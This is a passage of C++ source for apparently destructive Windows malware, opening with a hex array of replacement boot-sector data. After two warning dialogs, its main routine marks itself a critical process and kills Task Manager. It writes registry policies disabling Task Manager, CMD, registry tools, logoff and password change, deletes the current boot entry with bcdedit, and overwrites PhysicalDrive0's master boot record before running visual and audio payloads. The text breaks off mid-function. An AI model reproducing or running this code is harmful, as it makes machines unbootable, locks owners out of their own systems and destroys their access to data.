0x42,0xB0,0x08,0x44,0x29,0xBC,0x3D,0xB6,0xFE,0x5C,0x5C,0xF7,0x8A,0xF9,0xD7,0xDA,0xA6,0xBE,0x2C,0x16,
0xF6,0x98,0xFE,0x53,0x18,0xD3,0xBA,0xF6,0x6E,0x58,0x04,0x80,0xFF,0x46,0x03,0x02,0x7E,0x00,0x16,0xE7,
0xB6,0xE4,0xA1,0x51,0xF7,0x01,0xE0,0x4A,0x6E,0xC5,0x29,0xCF,0x5F,0x7C,0xDC,0x2E,0x5F,0x20,0x18,0x00,
0x88,0x76,0xF9,0x22,0x22,0x05,0xE0,0xF1,0xD4,0xD2,0x22,0xAF,0x0D,0x7B,0xEC,0x9D,0x20,0xFC,0x20,0x3B,
0x9E,0x35,0x15,0x8B,0x9B,0xC2,0x4F,0xE7,0x0F,0x36,0xC7,0x5B,0x92,0x07,0xFF,0x36,0x1F,0x80,0xAA,0x45,
0x0B,0xA8,0x93,0x1A,0x79,0x15,0x45,0xE4,0xBE,0x67,0x76,0x5D,0xFE,0x6F,0x86,0xBC,0xFB,0x76,0xEE,0xEF,
0xBB,0x8C,0xC3,0xEE,0x53,0x39,0xB2,0x7F,0x2F,0x39,0x6D,0x72,0x08,0x78,0x74,0x56,0x4D,0x5B,0x82,0x3C,
0x50,0xC2,0x14,0xA1,0xD2,0x02,0x89,0x4F,0x08,0xBA,0xDB,0xAC,0x1C,0xCA,0x6B,0x4F,0x62,0x7E,0x3E,0xD9,
0x39,0x99,0x8C,0x1F,0xB7,0x19,0x44,0x08,0x44,0x00,0x08,0xF1,0xDD,0xC8,0x4D,0x18,0x86,0x81,0xDF,0xEF,
0x47,0xD3,0x34,0x46,0x9C,0xD5,0x03,0x80,0xAC,0xF4,0x5E,0x0D,0xBF,0xF6,0xD8,0x78,0x21,0x17,0xEE,0x2C,
0xA0,0xB2,0x7F,0x5F,0x5E,0xBE,0xF6,0x37,0x8E,0xBE,0xD3,0x92,0x77,0xD6,0x1F,0x65,0xF6,0x34,0x98,0xF0,
0x98,0x40,0xD6,0x8C,0x45,0x1A,0x1A,0x8E,0x76,0xD7,0x50,0x59,0x7A,0x1E,0xEE,0xA4,0x85,0x0D,0x3F,0x81,
0xF7,0x5E,0x2D,0x8E,0x76,0xFD,0x40,0x67,0xD2,0xA4,0x4B,0x98,0xB3,0xE0,0x62,0x42,0xDE,0x78,0x6B,0x59,
0xB8,0x67,0x20,0xA5,0x15,0x50,0x50,0x6C,0x76,0xC8,0xCC,0xB0,0xA3,0xAA,0x02,0x43,0x17,0x38,0x5D,0x4E,
0x92,0xDC,0x4E,0x92,0x93,0x93,0x90,0xAE,0x24,0x4A,0x43,0x56,0x32,0x52,0x54,0x12,0x6D,0xE0,0xC0,0xEC,
0x49,0x68,0x06,0xEC,0x29,0x0E,0x31,0xB2,0x93,0x9F,0x9F,0x8E,0xC0,0x41,0x6B,0x36,0x19,0xD9,0xAD,0x49,
0x4D,0xCD,0xC0,0xE9,0x4E,0x40,0x55,0xAD,0xE8,0x01,0x3F,0x7E,0x4F,0x1D,0x41,0xBF,0x1F,0x4D,0x0F,0x62,
0x20,0xD1,0x75,0x03,0x4D,0xD7,0x51,0x2D,0x36,0xEC,0x56,0x4B,0xB3,0x69,0xB5,0xD9,0xB1,0xDA,0xEC,0x1C,
0x7E,0x71,0x03,0xBE,0x44,0x10,0x2E,0xB0,0xD6,0x81,0xC5,0x28,0xC7,0x50,0x72,0x90,0x19,0x27,0x13,0x6C,
0x75,0x1D,0xAA,0xBB,0x0B,0xA1,0xCC,0x41,0x48,0x87,0x4A,0x50,0xB4,0x80,0x84,0x8E,0x28,0x2D,0x86,0x62,
0xB3,0x39,0x09,0x19,0x3A,0x41,0x7B,0x47,0x94,0xF6,0x83,0xF9,0xE7,0x19,0x8B,0x50,0xC2,0x1E,0x75,0xBB,
0x2B,0x11,0x7F,0x28,0x44,0x28,0x14,0x44,0x4A,0x9D,0x50,0x9D,0x87,0x76,0xA9,0x21,0x42,0x21,0x05,0x69,
0x18,0xF8,0x42,0x10,0xD4,0x25,0xAA,0x22,0xC0,0x10,0x04,0x35,0x08,0x6A,0x12,0x4D,0x07,0x89,0x85,0x72,
0x4F,0x2A,0x1B,0x8A,0x5A,0x30,0x62,0xDC,0x9B,0xB4,0x6A,0x3D,0x98,0x56,0xED,0x4E,0x23,0xA8,0x6B,0x94,
0x96,0xAC,0xA7,0xA2,0x78,0x07,0x01,0x6F,0x25,0x41,0x7F,0x09,0x69,0x55,0x1F,0xA2,0xBD,0x0E,0x5D,0x72,
0xEB,0xBB,0x4E,0x46,0xB8,0xEB,0xBC,0x68,0x2B,0x7C,0x71,0x97,0x83,0x00,0x12,0x1D,0xD0,0x75,0x0D,0x2C,
0xC9,0xE0,0xCC,0x03,0x67,0x87,0xB8,0x8B,0x87,0xAB,0x93,0x49,0x5B,0x6E,0xD3,0x24,0xA9,0x11,0x1F,0xBD,
0x89,0x26,0xF9,0x94,0x50,0x78,0xCA,0xE1,0x8A,0x13,0xA9,0x08,0xFE,0xF3,0xE1,0x9E,0x63,0x8A,0x54,0x04,
0xB1,0x22,0x15,0x41,0x44,0xA4,0xF6,0x3A,0x3A,0x99,0x7E,0x40,0xE5,0xF7,0x8B,0x14,0xC0,0xD5,0xBD,0x4D,
0xD1,0x6B,0x08,0xF7,0xD9,0xA3,0x01,0xC8,0x4F,0xCB,0xA1,0xE0,0xDA,0x8B,0xD8,0x76,0xDD,0x64,0x6C,0x16,
0xCB,0xFF,0xB5,0xFC,0x73,0xB0,0x83,0x74,0x81,0x91,0x0C,0x46,0x2A,0xD5,0xD5,0xD5,0xD4,0xD5,0xD5,0xA1,
0xEB,0x3A,0x22,0x32,0xA2,0xF4,0x7F,0x1C,0x82,0x19,0x33,0x3E,0xE1,0x82,0x73,0xA7,0xE3,0x74,0x7F,0xD9,
0x60,0x5F,0xBD,0x65,0x26,0x26,0x74,0x12,0xD2,0x6A,0x81,0x90,0x06,0xC9,0x99,0x59,0xB8,0xDD,0x49,0xF8,
0xAA,0x4B,0x71,0xBA,0x52,0xD0,0x65,0x90,0x82,0xA2,0x52,0x1C,0xBA,0x4E,0x8A,0xD5,0x40,0x62,0x5A,0x75,
0x01,0x03,0x5A,0x66,0x26,0xF2,0xF1,0x0E,0x0B,0xF6,0x9C,0x8E,0x38,0x13,0x92,0x48,0x70,0xBA,0x50,0x6D,
0x76,0xA4,0x61,0x10,0x0A,0x06,0x09,0x85,0x4C,0x2B,0xCA,0x30,0x0C,0xA4,0x94,0x18,0x86,0x44,0xD7,0x75,
0x90,0x1A,0x59,0x39,0xAD,0x08,0x05,0x02,0x31,0x07,0xD2,0xF0,0xA4,0xC9,0xB8,0xB2,0x50,0xC8,0xBC,0x11,
0xD6,0xAE,0xFE,0x21,0xA6,0xCE,0xFF,0x43,0x73,0xD1,0x9C,0x46,0xF9,0xF5,0xA4,0xA7,0x21,0x6C,0x4D,0x6D,
0xEA,0xD5,0x8F,0x2B,0x26,0x98,0x23,0x64,0xAA,0xA2,0x36,0x12,0xA9,0x58,0xE7,0x39,0x10,0xB5,0xA6,0x22,
0x22,0x05,0xB0,0xD7,0xD1,0x09,0x5D,0x40,0x87,0xCF,0x52,0xE9,0xF1,0x30,0x18,0x6F,0x81,0x72,0x53,0xF4,
0xEB,0x1A,0x21,0x56,0xA4,0x62,0xF1,0xC1,0x66,0x07,0xDE,0x99,0x5E,0x94,0x50,0x88,0x23,0xAB,0x96,0xC5,
0xED,0xDB,0xFD,0xDD,0x7C,0x5A,0x54,0x95,0x02,0x10,0x7A,0x72,0x4A,0xDC,0xBE,0xAF,0x1E,0x5F,0x10,0xF7,
0x1A,0xE0,0xA2,0x47,0xC6,0x34,0x2C,0x82,0x63,0xD4,0x05,0x78,0xE2,0x99,0xA3,0x0D,0x8B,0xFE,0x22,0x34,
0xDD,0xB5,0x6D,0x12,0xF7,0xE6,0x72,0xEF,0xC9,0xCB,0xD9,0xEF,0x38,0x89,0x90,0x61,0x43,0x51,0x2B,0xF0,
0xD7,0xC1,0xBA,0x07,0x7F,0xE4,0xE4,0x2A,0x2F,0x8A,0x66,0xD0,0x12,0x89,0x06,0x8C,0x76,0x38,0x38,0xDC,
0xB6,0x2B,0x89,0x47,0x8E,0x90,0x99,0x99,0xCE,0xF8,0x0B,0x76,0xC5,0x7C,0x90,0x64,0xE6,0xE0,0x78,0x0B,
0xD4,0x92,0xB6,0x13,0x80,0x0B,0xCF,0x7C,0x38,0xAE,0xFC,0x78,0x10,0x2F,0xE5,0xC1,0x9D,0x05,0x5C,0xBB,
0xE8,0x69,0x5A,0xED,0xBD,0x0F,0x8A,0xE1,0xD1,0xD8,0x11,0xBF,0xDA,0x0D,0x48,0x43,0xA3,0xE7,0xD0,0xB3,
0xD9,0xBE,0xB7,0x5D,0x23,0x1F,0x29,0xC0,0x7B,0xAF,0x96,0xC4,0x59,0x54,0xA0,0x31,0x71,0xE2,0x14,0x16,
0x7E,0x7F,0x1E,0x35,0x75,0x57,0xC5,0x57,0x76,0xCD,0x06,0x54,0xC4,0x85,0xED,0x90,0x36,0xA7,0xC0,0x6E,
0xB7,0x91,0x90,0x92,0x4D,0xD0,0x5B,0x8D,0xAE,0x05,0x30,0xA4,0x01,0x12,0x74,0x03,0x2A,0xAA,0x43,0xB8,
0x15,0x49,0xAA,0xDD,0x14,0xAA,0xE2,0x50,0x1A,0xEB,0x42,0x99,0xB8,0x13,0x92,0x49,0x4A,0x49,0xC3,0xE9,
0x74,0x82,0xAA,0x62,0x68,0x06,0xC1,0x80,0x8F,0x60,0x30,0x84,0x21,0x43,0xE1,0x90,0x05,0x03,0xDD,0x30,
0x30,0x0C,0x03,0x0C,0x9D,0x19,0xAD,0x7F,0xE5,0xBA,0xEA,0x73,0xB0,0xB9,0x5C,0xF1,0x07,0x74,0x1C,0xA8,
0x8A,0x05,0x84,0x60,0xD9,0xF7,0x5F,0x34,0xDC,0xF5,0xFF,0xD0,0x0C,0x3C,0xF6,0xD8,0x89,0x85,0x0A,0xE0,
0xB4,0x82,0xCF,0xD8,0xD4,0xAB,0x1F,0x00,0x57,0x4C,0xB0,0xA2,0x28,0x2A,0x22,0x3C,0x48,0x22,0x4F,0xE0,
0x97,0xF2,0x78,0x6A,0x01,0xA2,0xD6,0x94,0x2E,0x60,0xEC,0xCF,0xA7,0x83,0xBE,0x8D,0x7F,0xCF,0x87,0x7B,
0xCE,0x3A,0x81,0x50,0xDD,0x04,0x64,0x37,0x2C,0x85,0x97,0xFE,0x61,0xFA,0xD3,0xAC,0x42,0xA0,0x18,0xA6,
0x2B,0xE2,0xC8,0x8A,0x65,0x04,0xC3,0xFD,0xE6,0x83,0x0B,0xE6,0x91,0xD4,0xA6,0x1D,0xE9,0x75,0x35,0x0C,
0xEF,0x36,0x20,0xFA,0x3E,0x6D,0xC1,0xB7,0xD1,0xED,0x08,0x2C,0x63,0xCE,0x6D,0x58,0x04,0xC7,0xA8,0x0B,
0xE0,0x9E,0xB5,0xB6,0x61,0xD1,0x31,0xF1,0xCE,0xC5,0xB1,0x43,0x13,0xC7,0xC7,0xB0,0xD7,0x97,0x36,0x2C,
0x3A,0x36,0x6E,0xB8,0x96,0xBB,0xFB,0x2C,0x65,0xA7,0xAD,0x1B,0x19,0x6D,0xFA,0x50,0x59,0xBC,0x96,0xDA,
0x2A,0x9D,0x1D,0x8F,0xFC,0xC2,0x28,0xAF,0xCE,0xBA,0x60,0x80,0x93,0x00,0x29,0x60,0xBC,0xDD,0xC9,0x91,
0x4E,0xDD,0x49,0x3C,0x7C,0x84,0xCC,0xD4,0x54,0xC6,0x5D,0x60,0x0A,0x51,0x44,0x2B,0x66,0x9E,0x3E,0x33,
0xFA,0xD0,0x92,0x52,0xF2,0xD6,0xBF,0xCC,0xDF,0x3D,0xB5,0x67,0xFD,0xA8,0xF0,0x89,0x70,0x61,0xBF,0x37,
0x41,0x1C,0xE1,0xB2,0xAC,0xA1,0xBC,0xF6,0xE2,0x4E,0x5E,0x3E,0xEF,0x37,0x1E,0x8D,0x1D,0xF1,0x0B,0xE8,
0x48,0x21,0xE8,0x35,0xE4,0x2C,0xB6,0xED,0x6D,0xD3,0xA4,0x50,0x6D,0xFF,0xE4,0x82,0xE8,0xF6,0x8C,0x2D,
0xF5,0xE5,0x93,0x62,0x1E,0x56,0xDD,0x22,0x1B,0xEB,0x5E,0x02,0x14,0xC4,0x95,0xC5,0x47,0xE4,0x47,0xB3,
0x26,0x83,0xB3,0x0B,0xD0,0x0E,0xF4,0x6C,0x50,0xD7,0xD4,0x6F,0x5F,0x77,0x63,0xFD,0xBB,0x4F,0x00,0xD3,
0xF1,0x75,0x7C,0x08,0x21,0xE8,0x95,0x9D,0x8A,0x27,0xF9,0x18,0x3E,0x96,0x26,0xE0,0x74,0x26,0x00,0xB0,
0x75,0x55,0x03,0xC7,0x32,0x60,0xC9,0x1C,0x8C,0x1E,0xD8,0x03,0xC6,0x0E,0x50,0x8A,0x40,0xD4,0x21,0xF0,
0x63,0xAC,0x5B,0x04,0xCB,0xD3,0x61,0x5F,0x1A,0x90,0x84,0x68,0xF7,0x7B,0xCD,0xE8,0xF8,0xDF,0x52,0xB8,
0xA2,0x7E,0xBB,0x22,0x60,0x63,0xD2,0x4A,0x27,0x6A,0xBB,0xDE,0x20,0xEA,0x9F,0x8E,0xD2,0x08,0x8F,0x28,
0x1A,0xBA,0x29,0xCE,0xBA,0x8E,0xAE,0xEB,0xE8,0xA1,0x10,0x75,0x5E,0x83,0x36,0x5D,0x26,0x63,0xE8,0x21,
0x84,0x00,0x5D,0x0F,0x12,0x0C,0xD5,0x12,0xF0,0x55,0xA0,0xEB,0xFE,0xFA,0x8F,0x91,0x66,0xA3,0xD3,0x82,
0x5E,0x6A,0xCA,0x8F,0xE0,0x72,0x26,0xE1,0x2F,0xDC,0x40,0xB5,0xD1,0xD8,0x25,0x2D,0x94,0x7A,0x3F,0x8E,
0x34,0x9A,0xEE,0x2A,0xD1,0x4C,0x8B,0x2A,0x82,0x67,0x5F,0xD9,0x19,0x27,0x52,0x10,0x1E,0xD5,0x35,0x34,
0xFC,0x81,0xA6,0x45,0x8A,0x06,0x5D,0x3E,0x3D,0xFC,0xBE,0x73,0x33,0x24,0xCA,0x57,0x69,0x5C,0xFA,0x1A,
0x3C,0x7A,0x3E,0x2C,0xDC,0x06,0x3F,0xED,0x82,0xD9,0x9B,0xA3,0x5F,0x07,0x11,0x91,0x8A,0x20,0x46,0xAC,
0x5E,0x7A,0x28,0x88,0x21,0x04,0x0A,0x0A,0x42,0x80,0xAA,0x08,0x54,0xCD,0x14,0xAB,0x7D,0x2B,0x7F,0x02,
0x20,0x84,0x42,0xED,0xD6,0x4D,0x00,0xA4,0xD7,0xD5,0x50,0xE1,0x5D,0x0E,0xC0,0xEC,0x9F,0x0E,0xD4,0x7F,
0x50,0x18,0xE3,0x87,0x35,0xF6,0xDF,0x71,0x8C,0xBA,0x00,0xCF,0xAD,0x68,0xBE,0x45,0x65,0x28,0xE6,0x00,
0x42,0x73,0xD0,0x27,0x69,0x50,0xC3,0xA2,0x63,0x62,0xFD,0x45,0x6D,0xFF,0x32,0xA1,0x9A,0x31,0x78,0x46,
0x5C,0x5B,0x58,0xF0,0xB2,0x19,0x5B,0xB7,0xAA,0xA8,0x2C,0x5A,0x76,0x22,0xEC,0xDE,0xEC,0xE4,0xF4,0x37,
0xB6,0x51,0x1B,0x3A,0x8D,0x9F,0x66,0x6F,0x26,0x65,0xED,0x6F,0x10,0x6E,0x63,0xD2,0x77,0x3E,0x68,0x1A,
0x08,0x1B,0xB5,0xD6,0xAF,0x49,0x4A,0x9D,0x87,0x2C,0x7D,0x0F,0x91,0x19,0x13,0x7A,0x10,0x6B,0x51,0xA5,
0x65,0x98,0x4E,0x6F,0xA1,0x01,0x35,0x4C,0x98,0x70,0x23,0xB3,0x66,0x3D,0x82,0x10,0x7D,0xEB,0x2B,0xBB,
0x66,0x99,0x16,0xD5,0xA5,0x47,0x0E,0xC8,0xCF,0xBF,0xB9,0x28,0xEC,0x0B,0x69,0x05,0x46,0x3A,0x28,0x1B,
0xEB,0xB7,0xAF,0x79,0x30,0xF6,0x3B,0x9A,0x44,0x73,0x04,0x0A,0x60,0x45,0x78,0x48,0xF3,0xD9,0xE7,0x52,
0xC3,0x21,0x9C,0x26,0xE2,0x3B,0x7A,0x8D,0x11,0x0C,0x99,0xB5,0x6F,0x7B,0xE5,0xA3,0x98,0x52,0x81,0x10,
0x0A,0x8A,0x10,0x08,0x45,0xC1,0x62,0x31,0x03,0xCA,0x96,0x2E,0xFD,0x91,0x8F,0x3F,0xFE,0x98,0xA3,0xDF,
0xCF,0x85,0x9F,0xC2,0x42,0x25,0x92,0x10,0x6D,0x7F,0x4F,0xB0,0x5F,0xD3,0xBF,0x67,0xEF,0x52,0x0B,0xAF,
0xED,0x74,0xB1,0xC8,0xD9,0x13,0x8B,0x6A,0x45,0x28,0x2A,0x52,0xEA,0x48,0x03,0x74,0xC3,0x40,0x97,0x3A,
0xE8,0x3A,0x86,0x61,0x60,0x18,0x3A,0xBA,0x34,0x30,0x82,0x21,0x34,0x5D,0xC7,0xEA,0xEE,0x45,0x6A,0x7A,
0x57,0x40,0xA2,0x6B,0x1E,0x42,0x7A,0x90,0x80,0xAF,0x1C,0x4D,0xF3,0x22,0x14,0xD3,0x6C,0x91,0x91,0x13,
0xA1,0x05,0xA8,0xAE,0x2C,0xC0,0xE1,0x4C,0x24,0x58,0xBC,0x93,0x8A,0x40,0x79,0xF4,0x18,0x84,0xE2,0xAC,
0x3F,0x20,0x69,0x06,0xD3,0x01,0x48,0x59,0x54,0x5F,0xDE,0x00,0xBF,0x47,0xA8,0x22,0x28,0x29,0x3C,0x18,
0xB5,0xA6,0x0C,0x43,0x23,0xA4,0x99,0x96,0x8D,0xDF,0x53,0x7B,0x5C,0x91,0x02,0xD0,0x05,0x64,0x97,0xEE,
0x66,0xE0,0xF6,0x53,0xD8,0x57,0x0C,0x1D,0xEF,0x87,0x1D,0x8F,0xC1,0xEB,0x3F,0xC1,0x6B,0x4B,0x61,0x40,
0x1E,0x9C,0xD3,0x13,0x9E,0xF8,0xA1,0x81,0x48,0xC5,0xE0,0xE5,0x97,0x03,0xC8,0xF0,0x71,0x0B,0x45,0x89,
0xB6,0x10,0x55,0x09,0x0F,0x61,0xEB,0x1A,0xBB,0x56,0x98,0x62,0x05,0x50,0xBB,0x75,0x13,0x6D,0x4F,0x1B,
0x42,0xA2,0x0C,0x87,0x31,0x2C,0xBC,0x37,0xBA,0x2F,0x82,0x73,0x9E,0x69,0xFA,0x3C,0x7C,0x7F,0x5F,0xD3,
0xD7,0xFB,0xB4,0x7F,0xEE,0x68,0x58,0x74,0x4C,0x48,0x3D,0xB1,0x61,0xD1,0x31,0x51,0x96,0x77,0xEC,0x87,
0x4A,0x43,0x84,0xCE,0x18,0xC9,0xED,0x5D,0x7F,0x60,0xAB,0xB5,0x0D,0x5D,0x4E,0x1D,0xCF,0xE1,0xED,0xDF,
0x50,0x55,0xEE,0xE3,0xE0,0x53,0x3B,0x19,0x53,0x07,0xD3,0x83,0x1E,0x2E,0x07,0x3C,0x0E,0x07,0x63,0x84,
0x42,0x61,0xF7,0xDE,0xB8,0x0F,0x1D,0x24,0xC3,0x9D,0xCC,0x05,0xE3,0xC2,0x42,0x15,0xC6,0x8C,0xD3,0xEA,
0x85,0x4A,0x4A,0xC9,0xD7,0x2F,0x9B,0x23,0x6D,0x41,0x57,0xD3,0x02,0xDE,0x14,0x66,0xCD,0xDD,0xC1,0xE0,
0x57,0x0B,0xA9,0x33,0xBA,0x32,0x60,0x40,0x77,0xDE,0x1D,0x79,0x1F,0xD3,0xA6,0xC1,0x92,0x22,0xC1,0xF2,
0x7F,0x8F,0x36,0xAF,0xD3,0xEF,0x12,0x2A,0x19,0x23,0x54,0x37,0x30,0x6B,0xD6,0x23,0x40,0x0E,0x42,0xE4,
0xD4,0xBF,0xC1,0x35,0x27,0x2C,0x54,0xF3,0xCE,0x06,0x7B,0x2E,0x90,0x69,0x3A,0xDE,0x94,0xBD,0xF5,0xDB,
0x37,0xBC,0x1B,0xFB,0x1D,0x51,0x34,0x57,0x9C,0x22,0x88,0x88,0x14,0xC0,0xE7,0x9F,0x0B,0xDE,0x8A,0xB1,
0x50,0x9A,0x82,0xDC,0xF2,0x0E,0x86,0x21,0x51,0x14,0x11,0xFD,0xFB,0xCD,0xFE,0xCC,0xF0,0x5E,0x61,0x0A
};
DWORD WINAPI KillMBR(LPVOID lpParam) {
	DWORD Bytes;
	HANDLE hFile = CreateFileA(
		"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, NULL, NULL);
	WriteFile(hFile, pcMbrData, 8192, &Bytes, NULL);
	return 1;
}
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon
);
BOOL EnablePrivilege(LPCWSTR lpszPriv)
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));
	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken)) { return FALSE; }
	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); 
		return FALSE;
	}
	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}
BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;
	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePrivilege(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) { return 0; }
		fSetCritical(1, 0, 0);
		return 1;
	}
	else { return 0; }
}
void reg_addition(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value)//credits to Mist0090 because creating registry keys in C++ without sh*tty system() or reg.exe is hell
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
	result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
	RegCloseKey(hKey);
	return;
}
int main()
{
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CREATE_NO_WINDOW;
	if (MessageBoxW(NULL, msgboxtext, title, MB_YESNO | MB_ICONWARNING) == IDNO) { ExitProcess(0); }
	else
	{
		if (MessageBoxW(NULL, finalmsgboxtext, finaltitle, MB_YESNO | MB_ICONWARNING) == IDNO) { ExitProcess(0); }
		else
		{
			Sleep(100);
			ProcessIsCritical();
			system("taskkill /f /im taskmgr.exe");
			system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
			system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
			system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
			system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
			system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
			system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
			system("bcdedit /delete {current}");
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			CreateThread(0, 0, KillMBR, 0, 0, 0);
			Sleep(5000);
			HANDLE thread0 = CreateThread(0, 0, CursorMoving, 0, 0, 0);
			HANDLE thread0_ = CreateThread(0, 0, fe, 0, 0, 0);
			Sleep(666);
			HANDLE thread1_num1 = CreateThread(0, 0, Payload1_num1, 0, 0, 0);
			HANDLE thread1_num2 = CreateThread(0, 0, Payload1_num2, 0, 0, 0);
			bytebeat1();
			TerminateThread(thread1_num1, 0);
			CloseHandle(thread1_num1);
			TerminateThread(thread1_num2, 0);
			CloseHandle(thread1_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread2_num1 = CreateThread(0, 0, Payload2_num1, 0, 0, 0);
			HANDLE thread2_num2 = CreateThread(0, 0, Payload2_num2, 0, 0, 0);
			HANDLE thread2_num3 = CreateThread(0, 0, Payload2_num3, 0, 0, 0);
			bytebeat2();
			TerminateThread(thread2_num1, 0);
			CloseHandle(thread2_num1);
			TerminateThread(thread2_num2, 0);
			CloseHandle(thread2_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread3_num1 = CreateThread(0, 0, Payload3_num1, 0, 0, 0);
			HANDLE thread3_num2 = CreateThread(0, 0, Payload3_num2, 0, 0, 0);
			bytebeat3();
			TerminateThread(thread3_num1, 0);
			CloseHandle(thread3_num1);
			TerminateThread(thread3_num2, 0);
			CloseHandle(thread3_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread4 = CreateThread(0, 0, Payload4_num1, 0, 0, 0);
			bytebeat4();
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread5_num1 = CreateThread(0, 0, Payload5_num1, 0, 0, 0);
			HANDLE thread5_num2 = CreateThread(0, 0, Payload5_num2, 0, 0, 0);
			bytebeat5();
			TerminateThread(thread5_num1, 0);
			CloseHandle(thread5_num1);
			TerminateThread(thread5_num2, 0);
			CloseHandle(thread5_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread6_num1 = CreateThread(0, 0, Payload6_num1, 0, 0, 0);
			HANDLE thread6_num2 = CreateThread(0, 0, Payload6_num2, 0, 0, 0);
			bytebeat6();
			TerminateThread(thread6_num1, 0);
			CloseHandle(thread6_num1);
			TerminateThread(thread6_num2, 0);
			CloseHandle(thread6_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread7_num1 = CreateThread(0, 0, Payload7_num1, 0, 0, 0);
			HANDLE thread7_num2 = CreateThread(0, 0, Payload7_num2, 0, 0, 0);
			bytebeat7();
			TerminateThread(thread7_num1, 0);
			CloseHandle(thread7_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread8 = CreateThread(0, 0, Payload8_num1, 0, 0, 0);
			bytebeat8();
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread9 = CreateThread(0, 0, Payload9_num1, 0, 0, 0);
			bytebeat9();
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread10 = CreateThread(0, 0, Payload10_num1, 0, 0, 0);
			bytebeat10();
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread11 = CreateThread(0, 0, Payload11_num1, 0, 0, 0);
			bytebeat11();
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread12_num1 = CreateThread(0, 0, Payload12_num1, 0, 0, 0);
			HANDLE thread12_num2 = CreateThread(0, 0, Payload12_num2, 0, 0, 0);
			bytebeat12();
			TerminateThread(thread12_num1, 0);
			CloseHandle(thread12_num1);
			TerminateThread(thread12_num2, 0);
			CloseHandle(thread12_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread13_num1 = CreateThread(0, 0, Payload13_num1, 0, 0, 0);
			HANDLE thread13_num2 = CreateThread(0, 0, Payload13_num2, 0, 0, 0);
			HANDLE thread13_num3 = CreateThread(0, 0, Payload13_num3, 0, 0, 0);
			HANDLE thread13_num4 = CreateThread(0, 0, Payload13_num4, 0, 0, 0);
			bytebeat13();
			TerminateThread(thread13_num1, 0);
			CloseHandle(thread13_num1);
			TerminateThread(thread13_num2, 0);
			CloseHandle(thread13_num2);
			TerminateThread(thread13_num3, 0);
			CloseHandle(thread13_num3);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread14_num1 = CreateThread(0, 0, Payload14_num1, 0, 0, 0);
			HANDLE thread14_num2 = CreateThread(0, 0, Payload14_num2, 0, 0, 0);
			bytebeat14();
			TerminateThread(thread14_num1, 0);
			CloseHandle(thread14_num1);
			TerminateThread(thread14_num2, 0);
			CloseHandle(thread14_num2);
			TerminateThread(thread2_num3, 0);
			CloseHandle(thread2_num3);
